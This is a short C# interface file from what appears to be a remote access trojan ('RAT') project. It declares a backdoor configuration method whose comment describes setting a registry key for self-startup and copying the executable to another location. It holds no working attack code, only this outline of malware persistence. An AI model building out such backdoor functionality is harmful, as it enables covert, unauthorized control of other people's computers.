using RAT.Configuration;

namespace RAT.Interfaces
{
    /// <summary>
    /// Contains logic to work with backdoor configuration.
    /// </summary>
    public interface IBackdoorConfigurationLogic
    {
        /// <summary>
        /// Configures our RAT.
        /// Set's up registry key for self-startup, copies exe to other location, and returns JSON configuration from exe.
        /// </summary>
        /// <returns>Backdoor configuration.</returns>
        BackdoorConfiguration Configure();
    }
}